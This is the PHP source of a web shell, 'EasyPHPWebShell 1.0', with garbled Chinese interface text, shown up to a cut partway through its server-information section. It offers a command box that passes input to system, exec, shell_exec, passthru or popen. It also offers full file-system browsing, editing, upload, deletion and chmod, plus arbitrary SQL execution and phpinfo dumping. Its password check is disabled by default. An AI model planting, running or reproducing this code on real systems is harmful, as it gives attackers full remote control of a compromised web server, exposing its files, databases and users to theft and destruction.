
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>EasyPHPWebShell(S8S8å¨´‹ç’‡•ç‰ˆ)</title>
    <style type="text/css">
    <!--
    body,td,th, h1, h2 {
        font-size: 12px;
        font-family: sans-serif;
    }
    body {background-color: #F8F8F8;}
    .style1 { 
        font-size: 12px;
        font-family: verdana, helvetica, sans-serif, ç€¹‹æµ£“;
        vertical-align: middle;
        border: 1px solid #000000; 
    }
    .stylebtext2 {color: #990000;font-weight: bold;}
    .stylebtext3 {color: #FFFFFF;font-weight: bold;}
     a:link,a:visited,a:active {color:#336699; text-decoration: underline;} 
     a:hover {COLOR: #990000;text-decoration: none;}
    table {border-collapse: collapse;}
    td, th { border: 1px solid #000000;}
    -->
</style>

<?php
@set_time_limit(0);
@error_reporting(E_ERROR | E_WARNING | E_PARSE);
@ob_start();
$pagestarttime = microtime();

if (get_magic_quotes_gpc()) {
    $_GET = array_stripslashes($_GET);
    $_POST = array_stripslashes($_POST);
}

/////å‚æ•æ‹Œô“£ç¼ƒ®

$chkpassword = 0;//æ˜ô•¨ôˆ›œ‰ç€µ†ç æ¥ Œç’‡

$my_password = "5065338";//ç’å‰§ç–†ç€µ†ç ,æ¿¡‚æœchkpasswordæ¶“º0,å§ã‚…¤„ç’å‰§ç–†æ— æ•ˆ.

$cookit_time = 24;//ç’å‰§ç–†cookieæœ‰æ•ˆæ—å •—´(å•æµ£:çæ—¶,å¨‰¨:æ¶“€æ¾¶©24çæ—¶)

//////ç¼“æŸ

?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>EasyPHPWebShell(S8S8å¨´‹ç’‡•ç‰ˆ)</title>
    <style type="text/css">
    <!--
    body,td,th, h1, h2 {
        font-size: 12px;
        font-family: sans-serif;
    }
    body {background-color: #F8F8F8;}
    .style1 { 
        font-size: 12px;
        font-family: verdana, helvetica, sans-serif, ç€¹‹æµ£“;
        vertical-align: middle;
        border: 1px solid #000000; 
    }
    .stylebtext2 {color: #990000;font-weight: bold;}
    .stylebtext3 {color: #FFFFFF;font-weight: bold;}
     a:link,a:visited,a:active {color:#336699; text-decoration: underline;} 
     a:hover {COLOR: #990000;text-decoration: none;}
    table {border-collapse: collapse;}
    td, th { border: 1px solid #000000;}
    -->
</style>

<?php

if($chkpassword == 1){
	@session_start();
	if ($_GET["action"] == "logout") {
		@session_unregister("smy_password");
		@session_destroy();
		@setcookie ("cmy_password","");
		echo "<script>function redirect(){window.location.replace(\"{$_SERVER['PHP_SELF']}\");}redirect();</script>";
	}
	if($_GET["action"] == "login"){
		if($my_password==$_POST["pmy_password"]){
			@session_register("smy_password");
			$_SESSION["smy_password"] = $my_password;
			@setcookie ("cmy_password",$my_password,time()+(3600*$cookit_time));
			echo "<script>function redirect(){window.location.replace(\"{$_SERVER['PHP_SELF']}\");}redirect();</script>";
		}
	}
	if (@session_is_registered("smy_password")||isset($_COOKIE["cmy_password"])){
		if (($_SESSION["smy_password"]!=$my_password)&&(!isset($_COOKIE["cmy_password"])||$_COOKIE["cmy_password"]!=$my_password))
			getloginpass();
	}else getloginpass();
}

if(!@get_cfg_var("register_globals")){
    foreach($_GET as $key => $val) $$key = $val;
    foreach($_POST as $key => $val) $$key = $val;
	foreach($_FILES as $key => $val) $$key = $val;
}

if(isset($df_path)){
    if (!file_exists($df_path)) $errordownload = "å¨Œâ„ƒ‰æƒ§ˆç‰ˆ–‡æµ ¶"; 
    else {
        $df_name = basename($df_path);
        $df_fhd=fopen($df_path,"rb");
        if($df_fhd==false) $errordownload = "æ‰“å¯®€æ–‡æµ å •”™ç’‡¯";
        else{
            Header("Content-type: application/octet-stream");
            Header("Accept-Ranges: bytes");
            Header("Accept-Length: ".filesize($df_path));
            Header("Content-Disposition: attachment; filename=".$df_name);
            echo fread($df_fhd,filesize($df_path));
            fclose($df_fhd);
            exit;
        }
    } 
}

if(isset($gotodir)) if($gotodir != "") $dir=$gotodir;

if(!isset($action)) {
    $action = "dir";
    $dir = ".";
}

if(!isset($dir)) $dir = ".";

$rootdir = str_replace("\\\\","/",$_SERVER["DOCUMENT_ROOT"]);

if(isset($abspath)) $dir = gettruepath($dir);
else if(isset($unabspath)){
    $dir = gettruepath($dir);
    if(strstr($dir,$rootdir)) $dir = str_replace("$rootdir",".",$dir);  
    else $dir=".";
}
$rny="<font color=green><b>â– </b></font>";$rnn="<font color=red><b>â– </b></font>";

?>

<SCRIPT LANGUAGE="JavaScript">
function rusuredel(msg,url){
    smsg = "çº­ô”Š®ç‘•åˆ é™ã‚†–‡æµ ¶(ç›ô”Š½•)[" + msg + "]å—?";
    if (confirm(smsg)){
        url = url + msg;
        window.location = url;
    } 
}

function rusurechk(msg,url){
    smsg = "å©§æ–‡æµ ¶(ç›ô”Š½•,çæ€§)æ¶“º[" + msg + "],ç’‡ç–¯¾“å…ãƒ§›ô”‹ ‡æ–‡æµ ¶(ç›ô”Š½•,çæ€§):";
    re = prompt(smsg,msg);
    if (re){
        url = url + re;
        window.location = url;
    }
}
</script>
</head>
<body>

<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" width="100%" bgcolor="#000000" class="stylebtext3">
            å¨†ãˆ£¿æµ£è·¨”¨EasyPHPWebShell 1.0(S8S8å¨´‹ç’‡•ç‰ˆ)ã€åˆ‡èô²”ã„¤ºæµ è®³½•éå¨‰•é€”å¯°„åôˆšˆ™åæœè‡ô•´Ÿã€‘
        </td>
    </tr>
    <tr>
        <td align="center" bgcolor="#EEEEEE">
            æœô‘–‡æµ å‰»ç€µç¡…çŸ¾å¯°„:<?php $stmp =str_replace("\\","/", __FILE__);echo "ã€<a href=\"$HTTP_SERVER_VARS[PHP_SELF]\">$stmp</a>ã€‘";?>ã€<a href="?action=logout">ç‚è§„ô‘«å¨‰ã„©”€æµ¼šç’‡</a>ã€‘
        </td>
    </tr>
    <tr>
        <td align="center"  bgcolor="#EEEEEE">ã€<a href="?action=dir&dir=.">æ–‡æµ å‰ô“†ç†</a>ã€‘ã€<a href="?action=editfile&dir=<?=urlencode($dir);?>&editfile=<?=urlencode($dir);?>/">æ–‡æœô‘¼–æˆ‘å™¨</a>ã€‘ã€<a href="?action=sql">æ•ç‰ˆô”Šº“æŸãƒ¨ô”¥</a>ã€‘ã€<a href="?action=shell">Shellå‘æˆ’æŠ¤</a>ã€‘ã€<a href="?action=env">çô•¨¢ƒå˜é‡</a>ã€‘ã€<a href="?action=phpinfo">PHPç»¯è¤»Ÿæ·‡â„ƒ¯</a>ã€‘ã€<a href="http://www.s8s8.net/forums/index.php?showtopic=15998">æŸãƒ§œ‹æ›å­˜–°</a>ã€‘
        </td>
    </tr>
</table>
<br>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td width="100%" bgcolor="#000000" align="center" class="stylebtext3">
<?php if($action == "dir"){?>
	æ–‡æµ å‰ô“†ç†
	</td>
	</tr>

	<tr>
	<form method="post" action="?action=dir&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;è¤°“å‰ç›ô”Š½•:&nbsp;
	<input name="gotodir" type="text" class="style1" value="<?=$dir?>" size="60">&nbsp;
	<input name="gotodirb" type="submit" class="style1" value="ç’ºå® æµ†"><?php if($dir[1] == ':') echo "ã€<a href=\"?action=dir&dir=".urlencode($dir)."&unabspath=1\">ç‚è§„ô‘«ç”¨<b>ç›ç¨¿ô”¼</b>ç’ºô•¨¾„æŸãƒ§œ‹</a>ã€‘&nbsp;";else echo "ã€<a href=\"?action=dir&dir=".urlencode($dir)."&abspath=1\">ç‚è§„ô‘«ç”¨<b>ç¼ç€µ¹</b>ç’ºô•¨¾„æŸãƒ§œ‹</a>ã€‘&nbsp;";?>
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=fileup&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;æ–‡æµ æœµ¸Šæµ¼ åˆ°(ç›ô”Š½•):
	<input name="filedir" type="text" class="style1" value="<?=$dir?>" size="30">&nbsp;æœô‘œç‰ˆ–‡æµ ¶:
	<input name="userfile" type="file" class="style1" size="30">&nbsp;
	<input name="userfileb" type="submit" class="style1" value="æ¶“Šæµ¼ ">
	</td>
	</form>
	</tr>

	<tr>
	<form method="post" action="?action=filecreate&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
	<td bgcolor="#EEEEEE">&nbsp;æ–æ¿ç¼“æ–‡æµ ¶(ç›ô”Š½•)åœã„¥½“å‰ç›ô”Š½•:&nbsp; 
	<input name="mkname" type="text" value="" size=30 class="style1">&nbsp;
	<input name="mkfileb" type="submit" value="æ–æ¿ç¼“æ–‡æµ ¶" class="style1">&nbsp;
	<input name="mkdirb" type="submit" value="æ–æ¿ç¼“ç›ô”Š½•" class="style1">&nbsp;è¤°“å‰ç›ô”Š½•çŠèˆµ€:ã€<b><?php $write = "æ¶“åô•¨†™";if(is_dir($dir)) {if ($fp = @fopen("$dir/temp.tmp", 'w')) {@fclose($fp);@unlink("$dir/temp.tmp");$write = "åô•¨†™";}}echo "$write</b>ã€‘";?>
	</td>
	</tr>
	</table>

	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr bgcolor="#000000" class="stylebtext3">
		<td width="25%">æ–‡æµ è·º</td>
		<td width="40%">å¯¤è™¹«‹æ—å •—´|æœ€åæ·‡ô”‹”è§„—å •—´</td>
		<td width="10%">æ¾¶Ñƒ°(KB)</td>
		<td width="8%">çæ€§</td>
		<td width="17%">æ“æµ£œ</td>
	</tr>
	<?php
	$filesum=0;$dirsum=0;$color="#EEEEEE";
	$dirs=@opendir($dir);
	while ($lop_fname=@readdir($dirs)){
		if(@is_dir("$dir/$lop_fname")){
			$lop_fsize = "-";
			$lop_fcdata = "-";
			$lop_fmdata = "-";
			$lop_foper="-";
			$lop_ftype="-";
			if($lop_fname==".."){
				if($dir == ".") continue;
				$dirb=@dirname($dir);
				if($dir[1] ==':'){
					$dirb = gettruepath($dirb);
					if(strlen($dirb) <=3) $dirb = substr($dirb,0,2);
				}
				$bp="â–³ ";
				$lop_fname = "æ¶“Šç»¾Ñ…›ô”Š½•";
			}else if($lop_fname=="."){
				if($dir == ".") continue;
				$dir[1] ==':'?$dirb = substr(gettruepath($dirb),0,2):$dirb=$lop_fname;
				$bp="â—‹ ";
				$lop_fname = "æ åœ­éª‡ç›ô”Š½•";
			}else{
				$lop_fsize = "[DIR]";
				$dirb="$dir/$lop_fname";    
				$lop_fcdata = @date("Y-n-d H:i:s",@filectime("$dirb"));
				$lop_fmdata = @date("Y-n-d H:i:s",@filemtime("$dirb"));
				$lop_ftype= substr(@base_convert(@fileperms($dirb),10,8),-4);
				$bp="â–¡ ";
				$title = "ç‚ç‘°‡æ˜¿›å…ãƒ¦–‡æµ è·ºã™[$lop_fname]";
				$lop_foper= "[<a href=\"åˆ é™¤\" title=\"åˆ é™ã‚†•ç¿ é‡œæ–‡æµ è·ºã™\" onClick=\"rusuredel('$dirb','?action=filedel&dir=$dir&deldir=');return false;\">åˆ </a>|".
							"<a href=\"é‡å‘è—‰\" title=\"é‡å‘è—‰\" onClick=\"rusurechk('$dirb','?action=filerename&dir=$dir&renamef=$dirb&renamet=');return false;\">é‡</a>|".
							"<a href=\"æ‹ç–¯´\" title=\"æ‹ç–¯´\" onClick=\"rusurechk('$dirb','?action=filecopy&dir=$dir&copydirf=$dirb&copydirt=');return false;\">æ‹·</a>|".
							"<a href=\"çæ€§\" title=\"æ·‡ô”‹”ç‘°±æ€§\" onClick=\"rusurechk('$lop_ftype','?action=filetype&dir=$dir&ctype=');return false;\">ç</a>]";
				$dirsum++;
			}
			$color=ch_color($color);
			echo    "<tr bgcolor=\"$color\">". 
							"<td width=\"25%\">$bp [<a href=\"?action=dir&dir=$dirb\" title = \"æ©›å…¥\">$lop_fname</a>]</td>".
							"<td width=\"40%\">[$lop_fcdata|$lop_fmdata]</td>".
							"<td width=\"10%\">$lop_fsize</td>".
							"<td width=\"8%\">$lop_ftype</td>".
							"<td width=\"17%\">$lop_foper</td>".
						"</tr>";
		}
	}
	@closedir($dirs);
	$dirs=@opendir($dir);
	while ($lop_fname=@readdir($dirs)){
		if(!@is_dir("$dir/$lop_fname")&&$lop_fname!=".."){
			$lop_ftype= substr(@base_convert(@fileperms("$dir/$lop_fname"),10,8),-4);
			$lop_foper= "[<a href=\"åˆ é™¤\" title=\"åˆ é™¤\" onClick=\"rusuredel('$dir/$lop_fname','?action=filedel&dir=$dir&delfile=');return false;\">åˆ </a>|".
						"<a href=\"é‡å‘è—‰\" title=\"é‡å‘è—‰\"  onClick=\"rusurechk('$dir/$lop_fname','?action=filerename&dir=$dir&renamef=$dir/$lop_fname&renamet=');return false;\">é‡</a>|".
						"<a href=\"æ‹ç–¯´\" title=\"æ‹ç–¯´\" onClick=\"rusurechk('$dir/$lop_fname','?action=filecopy&dir=$dir&copyfilef=$dir/$lop_fname&copyfilet=');return false;\">æ‹·</a>|".
						"<a href=\"çæ€§\" title=\"æ·‡ô”‹”ç‘°±æ€§\" onClick=\"rusurechk('$lop_ftype','?action=filetype&dir=$dir&cfile=$dir/$lop_fname&ctype=');return false;\">ç</a>|".
						"<a href=\"?action=dir&df_path=$dir/$lop_fname\" title=\"æ¶“‹æ½\">æ¶“‹</a>|".
						"<a href=\"?action=editfile&dir=$dir&editfile=$dir/$lop_fname\" title=\"ç¼‚–æˆ‘\">ç¼‚–</a>]";
			$color=ch_color($color);
			echo    "<tr bgcolor=\"$color\">". 
							"<td width=\"25%\">â–  <a href=\"$dir/$lop_fname\" title = \"æ–æ‰®ª—åï½„è…‘æ‰“å¯®€\" target=\"_blank\">$lop_fname</a></td>".
							"<td width=\"40%\">[".@date("Y-n-d H:i:s",@filectime("$dir/$lop_fname"))."|".@date("Y-n-d H:i:s",@filemtime("$dir/$lop_fname"))."]</td>".
							"<td width=\"10%\">".@number_format(@filesize("$dir/$lop_fname")/1024,3)."</td>".
							"<td width=\"8%\">".$lop_ftype."</td>".
							"<td width=\"17%\">$lop_foper</td>".
						"</tr>";
			$filesum++;
		}
	}
	@closedir($dirs);
	?>										  
	<tr bgcolor="#000000" class="stylebtext3" align="center">
		<td width="25%" colspan="5">ç›ô”Š½•æ•°:<?=$dirsum?>,æ–‡æµ èˆµ•°:<?=$filesum?></td>
	</tr>
	</table>      
<?php }else if ($action == "editfile"){?>
	æ–‡æœô‘¼–æˆ‘å™¨(è‹ãƒ§›ô”‹ ‡æ–‡æµ æœµ¸ç€›˜åœã„¥°†æ–æ¿ç¼“æ–ç‰ˆ–‡æµ ¶)
	</td>
	</tr>

	<tr>
	<form method="post" action="?action=filesave&dir=<?=urlencode($dir);?>" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">è¤°“å‰ç¼‚–æˆ‘æ–‡æµ è·º:
			<input name="editfilename" type="text" class="style1" value="<?=$editfile?>" size="30">
			<input name="editbackfile" type="checkbox" value="1" class="style1">ç”Ÿæˆæ¾¶‡æµ èŠ¥–‡æµ ¶(åŸæ–‡æµ ¶.bak)<br>
			<textarea name="editfiletext" cols="120" rows="25" class="style1"><?php 
				$fd = @fopen($editfile, "rb");
				$fd==false?$readfbuff = "ç’‡è¯²–æ–‡æµ å •”™ç’‡¯(æˆ–çšæœô•ô”¾å–æ–‡æµ ¶).":$readfbuff = @fread($fd, filesize($editfile));
				@fclose( $fd );
				$readfbuff = htmlspecialchars($readfbuff);
				echo "$readfbuff";
			?></textarea><p>
			<input name="editfileb" type="submit" value="ææµœ¤" class="style1">&nbsp;&nbsp;
			<input name="editagainb" type="reset" value="é‡ç¼ƒ®" class="style1">
			<a href="?action=dir&dir=<?=urlencode($dir);?>">ç‚è§„ô‘«æ©”å›æ–‡æµ èˆµµç‘™ˆæ¤¤ç”¸¢</a>
			<p>
		</td>
	</form>
	</tr>
	</table>
<?php }else if("sql" == substr($action,0,3)){?>
	æ•ç‰ˆô”Šº“æŸãƒ¨ô”¥
	</td>
	</tr>
	
	<tr>
	<form method="post" action="?action=sql" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			æ•ç‰ˆô”Šº“åœæ¿€:<input name="sqlhost" type="text" class="style1" value="<?=isset($sqlhost)?$sqlhost:"localhost"?>" size="20">
			ç»”ô•¨£:<input name="sqlport" type="text" class="style1" value="<?=isset($sqlport)?$sqlport:"3306"?>" size="5">
			ç”ã„¦ˆå³°:<input name="sqluser" type="text" class="style1" value="<?=isset($sqluser)?$sqluser:"root"?>" size="10">
			ç€µ†ç :<input name="sqlpasd" type="text" class="style1" value="<?=isset($sqlpasd)?$sqlpasd:""?>" size="10">
			æ•ç‰ˆô”Šº“å:<input name="sqldb" type="text" class="style1" value="<?=isset($sqldb)?$sqldb:""?>" size="10"><br>
			<textarea name="sqlcmdtext" cols="120" rows="10" class="style1"><?php 
				if(!empty($sqlcmdtext)){
					@mysql_connect("{$sqlhost}:{$sqlport}","$sqluser","$sqlpasd") or die("æ•ç‰ˆô”Šº“æ©æãƒ¥ã‘ç’¥");
					@mysql_select_db("$sqldb") or die("é€‰æ‹â•‚•ç‰ˆô”Šº“æ¾¶è¾«è§¦");
					$res = @mysql_query("$sqlcmdtext");
					echo $sqlcmdtext;
					mysql_close();
				}
			?></textarea><p>
			<span class="stylebtext2"><?php echo isset($sqlcmdb)?($res?"æ‰Ñ†¡ŒæˆåŠŸ.":"æ‰Ñ†¡Œæ¾¶è¾«è§¦:".mysql_error()):"";?></span><p>
			<input name="sqlcmdb" type="submit" value="æ‰Ñ†¡Œ" class="style1">&nbsp;&nbsp;
			<input name="sqlagainb" type="reset" value="é‡ç¼ƒ®" class="style1">
			<p>
		</td>
	</form>
	</tr>
	</table>
<?php }else if("shell" == substr($action,0,5)){?>
	Shellå‘æˆ’æŠ¤
	</td>
	</tr>

	<tr>
		<form method="post" action="?action=shell" enctype="multipart/form-data">
		<td align="center" valign="top" bgcolor="#EEEEEE">
			å‡èŠ¥•°:<select name="seletefunc" class="input">
				<option value="system" <?=($seletefunc=="system")?"selected":"";?>>system</option>
				<option value="exec" <?=($seletefunc=="exec")?"selected":"";?>>exec</option>
				<option value="shell_exec" <?=($seletefunc=="shell_exec")?"selected":"";?>>shell_exec</option>
				<option value="passthru" <?=($seletefunc=="passthru")?"selected":"";?>>passthru</option>
				<option value="popen" <?=($seletefunc=="popen")?"selected":"";?>>popen</option>
			</select>
			å‘æˆ’æŠ¤:<input name="shellcmd" type="text" class="style1" value="<?=isset($shellcmd)?$shellcmd:""?>" size="80">
			<textarea name="shelltext" cols="120" rows="10" class="style1"><?php 
				if(!empty($shellcmd)){
					if($seletefunc=="popen"){
						$pp = popen($shellcmd, 'r');
						echo fread($pp, 2096);
						pclose($pp);
					}else{
						echo $out =  ("system"==$seletefunc)?system($shellcmd):(($seletefunc=="exec")?exec($shellcmd):(($seletefunc=="shell_exec")?shell_exec($shellcmd):(($seletefunc=="passthru")?passthru($shellcmd):system($shellcmd))));	
					}
				}
			?></textarea><p>
			<span class="stylebtext2"><?php echo get_cfg_var("safe_mode")?"æç»€º:ç€¹‰å…ã„¦Äå¯®æ¶“‹åô•«ƒèŠ¥— å¨‰•æ‰Ñ†¡Œ":"";?></span><p>
			<input name="shellcmdb" type="submit" value="æ‰Ñ†¡Œ" class="style1">&nbsp;&nbsp;
			<input name="shellagainb" type="reset" value="é‡ç¼ƒ®" class="style1">
			<p>
	</td>
	</form>
	</tr>
	</table>
<?php }else if($action=="phpinfo"){?>
	PHPç»¯è¤»Ÿæ·‡â„ƒ¯
	</td>
	</tr>

	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2"><br><?php phpinfo();
		if(eregi("phpinfo",get_cfg_var("disable_functions"))) echo "<b>phpinfoå‡èŠ¥•æ‹Œô¨ç»‚å§¢</b><br>";
	?><br>
	</td>
	</tr>
	</table>
<?php }else if("file" == substr($action,0,4)){?>
	ç»¯è¤»Ÿå¨‘ˆæ¯
	</td>
	</tr>

	<tr>
	<td align="center" bgcolor="#EEEEEE" class="stylebtext2">
	<br>
	<?php 
		if($action == "filesave"){
			if(isset($editfileb)&&isset($editfilename)){
				if(isset($editbackfile)&&($editbackfile == 1)) 
					echo $out = @copy($editfilename,$editfilename.".bak")?"ç”Ÿæˆæ¾¶‡æµ èŠ¥–‡æµ èˆµˆåŠŸ.<p>":"ç”Ÿæˆæ¾¶‡æµ èŠ¥–‡æµ èˆµˆåŠŸ<p>";
				$fd = @fopen($editfilename, "w");
				if($fd == false) echo "æ‰“å¯®€æ–‡æµ ¶[$editfilename]é”™ç’‡¯.";
				else{
					echo $out=@fwrite($fd,$editfiletext)?"ç¼‚–æˆ‘æ–‡æµ ¶[$editfilename]æˆåŠŸ!":"å†™å…ãƒ¦–‡æµ èˆµ–‡æµ ¶[$editfilename]é”™ç’‡¯";
					@fclose( $fd );
				}
			}
		}else if($action == "filedel"){
			if(isset($deldir)) {
				echo $out = file_exists($deldir)?(deltree($deldir)?"åˆ é™ã‚‡›ô”Š½•[$deldir]æˆåŠŸ!":"åˆ é™ã‚‡›ô”Š½•[$deldir]æ¾¶è¾«è§¦!"):"ç›ô”Š½•[$deldir]æ¶“ç€›˜åœ¨!!";
			}else if(isset($delfile)){
				@chmod("$delfile", 0777);
				echo $out = file_exists($delfile)?(@unlink($delfile)?"åˆ é™ã‚†–‡æµ ¶[$delfile]æˆåŠŸ!":"åˆ é™ã‚†–‡æµ ¶[$delfile]æ¾¶è¾«è§¦!"):"æ–‡æµ ¶[$delfile]æ¶“ç€›˜åœ¨!";
			}
		}else if($action == "filerename"){
			echo $out = file_exists($renamef)?(@rename($renamef,$renamet)?"é‡å‘è—‰[$renamef]æ¶“º[{$renamet}]æˆåŠŸ":"é‡å‘è—‰[$renamef]æ¶“º[{$renamet}]æ¾¶è¾«è§¦"):"æ–‡æµ ¶[$renamef]æ¶“ç€›˜åœ¨!";
		}else if($action =="filecopy") {
			if(isset($copydirf)&&isset($copydirt)){
				echo $out = file_exists($copydirf)?(truepath($copydirt)?(copydir($copydirf,$copydirt)?"æ‹ç–¯´ç›ô”Š½•[$copydirf]åˆ°[$copydirt]æˆåŠŸ":"æ‹ç–¯´ç›ô”Š½•[$copydirf]åˆ°[$copydirt]æ¾¶è¾«è§¦"):"ç›ô”‹ ‡ç›ô”Š½•[$copydirt]æ¶“ç€›˜åœã„¤¸”åˆ›å¯¤æ´ª”™ç’‡¯"):"ç›ô”Š½•[$copydirf]æ¶“ç€›˜åœ¨!";
			}else if(isset($copyfilef)&&isset($copyfilet)){
				echo $out = file_exists($copyfilef)?(truepath(dirname($copyfilet))?(@copy($copyfilef,$copyfilet)?"æ‹ç–¯´æ–‡æµ ¶[$copyfilef]åˆ°[$copyfilet]æˆåŠŸ":"æ‹ç–¯´æ–‡æµ ¶[$copyfilef]åˆ°[$copyfilet]æ¾¶è¾«è§¦"):"ç›ô”‹ ‡ç›ô”Š½•æ¶“ç€›˜åœã„¤¸”åˆ›å¯¤æ´ª”™ç’‡¯"):"å©§æ–‡æµ ¶[$copyfilef]æ¶“ç€›˜åœ¨!";
			}
		}else if($action == "filecreate"){
			if(isset($mkdirb)){
				echo $out = file_exists("$dir/$mkname")?"[{$dir}/{$mkname}]ç’‡ãƒ§›ô”Š½•å®¸æ’­˜åœ¨":(@mkdir("$dir/$mkname",0777)?"ç›ô”Š½•[$mkname]åˆ›å¯¤çƒ˜ˆåŠŸ":"ç›ô”Š½•[$mkname]åˆ›å¯¤å“„ã‘ç’¥");
			}else if(isset($mkfileb)){
				if(file_exists("$dir/$mkname")) echo "[$dir/$mkname]ç’‡ãƒ¦–‡æµ è·ºå‡¡ç€›˜åœ¨";
				else{
					$fd = @fopen("$dir/$mkname", "w");
					if($fd == false) echo "å¯¤è™¹«‹æ–‡æµ ¶[$mkname]é”™ç’‡¯.";
					else{
						echo "å¯¤è™¹«‹æ–‡æµ ¶[$mkname]æˆåŠŸ <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($dir)."/".urlencode($mkname)."\"><p>ç‚è§„ô‘«ç’ºå® æµ†å…ãƒ§¼–æˆ‘å¨´ç‘™ˆæ¤¤ç”¸¢</a>";
						@fclose( $fd );
					}
				}
			}
		}else if($action == "filetype"){
			echo $out=@chmod($cfile,base_convert($ctype,8,10))?"æ›å­˜”è§„ˆåŠŸ!":"æ›å­˜”ç‘°ã‘ç’¥!";
		}else if($action == "fileup"){
			echo  $out = @copy($userfile["tmp_name"],"{$filedir}/{$userfile['name']}")?"æ¶“Šæµ¼ æ–‡æµ ¶[{$userfile['name']}]æˆåŠŸ.æµ£ç¼ƒ®:[{$filedir}/{$userfile['name']}]å…±({$userfile['size']})ç€›—èŠ‚.":"æ¶“Šæµ¼ æ–‡æµ ¶[{$userfile['name']}]æ¾¶è¾«è§¦";
		}else{
			echo "é”™ç’‡ô•ªš„ææµœã‚…‚æ•°action.";
		}
	?>
	<p>
	<a href="?action=dir&dir=<?=urlencode($dir);?>">ç‚è§„ô‘«æ©”å›æ–‡æµ èˆµµç‘™ˆæ¤¤ç”¸¢</a>
	<p>
	</td>
	</tr>
	</table>

<?php }else if($action=="env"){?>
	çô•¨¢ƒå˜é‡&nbsp;&nbsp;<?=$rny?>æ”ô•©Œ&nbsp;&nbsp;<?=$rnn?>æ¶“æ”ô•©Œ<br>
	</td>
	</tr>
	<?php 
	$sinfo[0] = array("æ¶“ç»˜œå“„ŸŸå:",$_SERVER["SERVER_NAME"]);
	$sinfo[1] = array("æ¶“ç»˜œºIP:",gethostbyname($_SERVER["SERVER_NAME"]));
	$sinfo[2] = array("æ¶“ç»˜œè™¹ôºå£:",$_SERVER["SERVER_PORT"]);
	$sinfo[3] = array("æ¶“ç»˜œçƒ˜—å •—´:",date("Y/m/d_h:i:s",time()));
	$sinfo[4] = array("æ¶“ç»˜œè™¹éƒ´ç¼Ÿ:",PHP_OS);
	$sinfo[5] = array("æ¶“ç»˜œºWEBæœåŠâ€³™¨",$_SERVER["SERVER_SOFTWARE"]);
	$sinfo[6] = array("PHPç‰ˆæœ¬:",PHP_VERSION);
	$sinfo[7] = array("å‰â•€½™ç»Œæ´ª—´:",intval(diskfreespace(".") / (1024 * 1024).'MB'));
	$sinfo[8] = array("æ¶“ç»˜œé¸¿ô”°ç‘·€",$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
	$sinfo[9] = array("è¤°“å‰ç”ã„¦ˆ·",get_current_user());
	$sinfo[10] = array("æœ€æ¾¶Ñƒ†…ç€›˜å ç”¨:",my_func("memory_limit",1));
	$sinfo[11] = array("æœ€æ¾¶Ñƒ•æ¶“ô‘¸Šæµ¼ æ–‡æµ ¶",my_func("upload_max_filesize",1));
	$sinfo[12] = array("POSTæœ€æ¾¶Ñƒô“é‡",my_func("post_max_size",1));
	$sinfo[13] = array("è„šæœô‘‘¶…æ—¶",my_func("max_execution_time",1));
	$sinfo[14] = array("çè”ç•Œš„å‡èŠ¥•°",my_func("disable_functions",1));

	$ssql[0] = array("MYSQL",my_func("mysql_close",2)); 
	$ssql[1] = array("Oracle",my_func("ora_close",2)); 
	$ssql[2] = array("Oracle 8",my_func("OCILogOff",2)); 
	$ssql[3] = array("OBDC",my_func("odbc_close",2)); 
	$ssql[4] = array("SyBase",my_func("sybase_close",2)); 
	$ssql[5] = array("SQL_Server",my_func("mssql_close",2)); 
	$ssql[6] = array("DBase",my_func("dbase_close",2)); 
	$ssql[7] = array("Hyperwave",my_func("hw_close",2));
	$ssql[8] = array("Postgre_SQL",my_func("pg_close",2));

	$sobj[0] = array("Sessionæ”ô•©Œ",my_func("session_start",2));
	$sobj[1] = array("Socketæ”ô•©Œ",my_func("fsockopen",2));
	$sobj[2] = array("å‹ç¼‚â•‚–‡æµ èˆµ”ô•©Œ(Zlib)",my_func("gzclose",2));
	$sobj[3] = array("SMTPæ”ô•©Œ",my_func("smtp",2));
	$sobj[4] = array("XMLæ”ô•©Œ",my_func("XML Support",3));
	$sobj[5] = array("FTPæ”ô•©Œ",my_func("FTP support",3));
	$sobj[6] = array("Sendmailæ”ô•©Œ",my_func("Internal Sendmail Support for Windows 4",3));
	$sobj[7] = array("SNMPæ”ô•©Œ",my_func("snmpget",2));
	$sobj[8] = array("PDFæ–‡å¦—ï½†”ô•©Œ",my_func("pdf_close",2));
	$sobj[9] = array("IMAPç”é›­é‚ô”‰æ¬¢æ”ô•©Œ",my_func("imap_close",2));
	$sobj[10] = array("å›æƒ§èˆ°æ¾¶„ç†GD Libraryæ”ô•©Œ",my_func("imageline",2));
	$sobj[11] = array("ZENDæ”ô•©Œ",my_func("zend_version",2)."(".zend_version().")");

	$sobj[12] = array("å…ç’é•å¨‡ç”¨URLæ‰“å¯®€æ–‡æµ ¶",my_func("allow_url_fopen",2));
	$sobj[13] = array("PRELç›ç¨¿ô“ç’‡ô’­³• PCRE",my_func("preg_match",2));
	$sobj[14] = array("æ˜å‰§ãšé”™ç’‡ô•§ä¿Šæ¯",my_func("display_errors",2));
	$sobj[15] = array("è‡ô’Šã„¥®šæ¶”‰å…ã„¥±€å˜é‡",my_func("register_globals",2));
	$sobj[16] = array("PHPæ©ç›Œæ–ç‘°¼",strtoupper(php_sapi_name()));
	?>

	<tr>
	<td align="center" bgcolor="#EEEEEE">
		<table width="600" border="0" cellpadding="0" cellspacing="0"><br>
			<tr><td align="center" bgcolor="#000000" class="stylebtext3" colspan="2">æ¶“ç»˜œè½°ä¿Šæ¯</td></tr>
			<?php 
			for($i=0;$i<15;$i++){
				$color=ch_color($color);
